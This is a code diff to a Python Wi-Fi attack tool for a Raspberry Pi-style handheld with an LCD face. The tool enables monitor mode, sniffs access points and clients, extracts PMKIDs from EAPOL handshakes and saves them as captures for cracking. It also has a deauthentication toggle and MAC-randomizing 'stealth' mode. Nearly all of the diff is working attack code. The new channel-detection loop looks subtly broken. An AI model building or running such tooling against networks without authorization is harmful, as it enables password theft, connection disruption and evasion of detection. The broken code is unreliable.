@@ -45,8 +45,9 @@ except ImportError:
 try:
     from scapy.all import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap, EAPOL, sendp, sniff as scapy_sniff, wrpcap, conf
     SCAPY_OK = True
-except ImportError:
+except Exception as e:
     SCAPY_OK = False
+    print(f"Scapy import failed: {e}")
 
 # GPIO & LCD
 PINS = {"UP":6, "DOWN":19, "LEFT":5, "RIGHT":26, "OK":13, "KEY1":21, "KEY2":20, "KEY3":16}
@@ -187,14 +188,41 @@ def get_mac(iface):
 
 def monitor_up(iface):
     """Enable monitor mode."""
-    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
-    time.sleep(1)
-    result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True)
+    try:
+        subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, timeout=5)
+        time.sleep(1)
+    except:
+        pass
+
+    try:
+        result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True, timeout=10)
+        print(f"airmon-ng output: {result.stdout} {result.stderr}")
+    except Exception as e:
+        print(f"airmon-ng failed: {e}")
+        return None
+
     time.sleep(2)
 
-    for candidate in [f"{iface}mon", f"{iface}-mon"]:
-        if subprocess.run(["ip", "link", "show", candidate], capture_output=True).returncode == 0:
-            return candidate
+    # Check various naming patterns
+    for candidate in [f"{iface}mon", f"{iface}-mon", f"wlan{iface[-1]}mon", f"wlan{iface[-1]}-mon"]:
+        try:
+            if subprocess.run(["ip", "link", "show", candidate], capture_output=True, timeout=5).returncode == 0:
+                print(f"Monitor interface found: {candidate}")
+                return candidate
+        except:
+            pass
+
+    # Try iw to find monitor interface
+    try:
+        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
+        for line in result.stdout.split('\n'):
+            if 'monitor' in line.lower():
+                parts = line.split()
+                if parts:
+                    return parts[0]
+    except:
+        pass
+
     return None
 
 def monitor_down(iface):
@@ -278,6 +306,18 @@ def packet_handler(pkt):
             essid = "<hidden>"
 
         sig = getattr(pkt, "dBm_AntSignal", -99)
+
+        # Try to get channel from Dot11Elt
+        try:
+            ch = None
+            for elt in pkt[Dot11Beacon].layers:
+                if hasattr(elt, 'DSset'):
+                    ch = elt.DSset
+                    break
+            ch = ch or "1"
+        except:
+            ch = "1"
+
         with lock:
             beacon_cache[bssid] = pkt
             if bssid not in session_aps:
@@ -289,12 +329,11 @@ def packet_handler(pkt):
                 session_aps[bssid]["signal"] = sig
                 session_aps[bssid]["essid"] = essid
 
-            ch = pkt[Dot11].addr1 or "1"
             channel_activity[ch] += 1
             set_mood("scanning")
 
     # Data: find clients
-    if pkt[Dot11].type == 2:
+    if hasattr(pkt[Dot11], 'type') and pkt[Dot11].type == 2:
         src = (pkt[Dot11].addr2 or "").upper()
         bss = (pkt[Dot11].addr3 or "").upper()
         if bss in session_aps and src != bss and src != "FF:FF:FF:FF:FF:FF":
@@ -330,23 +369,34 @@ def packet_handler(pkt):
                         is_m1 = (key_info & 0x08) and (key_info & 0x80) and not (key_info & 0x100)
 
                         if is_m1:
-                            data_len = int.from_bytes(eapol_raw[97:99], "big")
-                            key_data = eapol_raw[99:99+data_len]
-                            i = 0
-                            while i+6 < len(key_data):
-                                if key_data[i] == 0xdd and key_data[i+1] >= 20:
-                                    oui = key_data[i+2:i+5]
-                                    if oui == b'\x00\x0f\xac' and key_data[i+5] == 4:
-                                        pmkid = key_data[i+6:i+22]
-                                        if pmkid != b'\x00'*16:
-                                            captured_bssids.add(bssid)
-                                            session_pmkid += 1
-                                            lifetime_pmkid += 1
-                                            essid = session_aps[bssid]["essid"]
-                                            set_mood("pmkid")
-                                            save_capture(bssid, essid, [pkt], "pmkid")
-                                        break
-                                i += (2 + key_data[i+1]) if key_data[i+1] > 0 else 2
+                            try:
+                                data_len = int.from_bytes(eapol_raw[97:99], "big")
+                                if data_len > 0 and data_len < 1000:
+                                    key_data = eapol_raw[99:99+data_len]
+                                    # Look for PMKID KDE (0xdd with OUI 0x000fac and type 4)
+                                    idx = 0
+                                    while idx + 7 < len(key_data):
+                                        if key_data[idx] == 0xdd:
+                                            kde_len = key_data[idx+1]
+                                            if idx + 2 + kde_len <= len(key_data):
+                                                oui = key_data[idx+2:idx+5]
+                                                kde_type = key_data[idx+5] if idx+5 < len(key_data) else 0
+                                                if oui == b'\x00\x0f\xac' and kde_type == 4:
+                                                    if idx + 22 <= len(key_data):
+                                                        pmkid = key_data[idx+6:idx+22]
+                                                        if pmkid != b'\x00'*16 and len(pmkid) == 16:
+                                                            captured_bssids.add(bssid)
+                                                            session_pmkid += 1
+                                                            lifetime_pmkid += 1
+                                                            essid = session_aps[bssid]["essid"]
+                                                            set_mood("pmkid")
+                                                            save_capture(bssid, essid, [pkt], "pmkid")
+                                                            break
+                                            idx += 2 + kde_len
+                                        else:
+                                            idx += 1
+                            except:
+                                pass
                 except:
                     pass
 
@@ -416,17 +466,27 @@ def channel_hopper():
         else:
             ch = random.choice(channels_24)
 
-        set_channel(mon_iface, ch)
+        try:
+            set_channel(mon_iface, ch)
+        except:
+            pass
 
         if stealth_enabled and random.random() < 0.1:
-            randomize_mac(mon_iface)
+            try:
+                randomize_mac(mon_iface)
+            except:
+                pass
 
-        if not shutdown.wait(timeout=2):
-            continue
+        shutdown.wait(timeout=2)
 
 def sniffer_thread():
     """Packet sniffer."""
-    if not SCAPY_OK or not mon_iface:
+    if not SCAPY_OK:
+        print("Scapy not available")
+        return
+
+    if not mon_iface:
+        print("No monitor interface")
         return
 
     try:
@@ -434,12 +494,15 @@ def sniffer_thread():
     except:
         pass
 
-    scapy_sniff(
-        iface=mon_iface,
-        prn=packet_handler,
-        stop_filter=lambda _: shutdown.is_set() or not capture_event.is_set(),
-        store=0
-    )
+    try:
+        scapy_sniff(
+            iface=mon_iface,
+            prn=packet_handler,
+            stop_filter=lambda _: shutdown.is_set() or not capture_event.is_set(),
+            store=0
+        )
+    except Exception as e:
+        print(f"Sniffer error: {e}")
 
 def draw_face():
     """Draw main face view."""
@@ -591,9 +654,10 @@ def main():
     threading.Thread(target=channel_hopper, daemon=True).start()
 
     view = "face"
+    last_draw_time = 0
     try:
         while not shutdown.is_set():
-            btn = wait_btn(0.2)
+            btn = wait_btn(0.1)
 
             if btn == "KEY3":
                 break
@@ -601,17 +665,26 @@ def main():
                 view = {"face": "stats", "stats": "captures", "captures": "face"}[view]
             elif btn == "KEY2":
                 stealth_enabled = not stealth_enabled
-                if stealth_enabled:
-                    randomize_mac(mon_iface)
+                try:
+                    if stealth_enabled:
+                        randomize_mac(mon_iface)
+                except:
+                    pass
             elif btn == "LEFT":
                 deauth_enabled = not deauth_enabled
 
-            if view == "face":
-                draw_face()
-            elif view == "stats":
-                draw_stats()
-            elif view == "captures":
-                draw_captures()
+            # Redraw every 0.2 seconds
+            if time.time() - last_draw_time > 0.2:
+                try:
+                    if view == "face":
+                        draw_face()
+                    elif view == "stats":
+                        draw_stats()
+                    elif view == "captures":
+                        draw_captures()
+                    last_draw_time = time.time()
+                except Exception as e:
+                    print(f"Draw error: {e}")
 
             time.sleep(0.05)
 
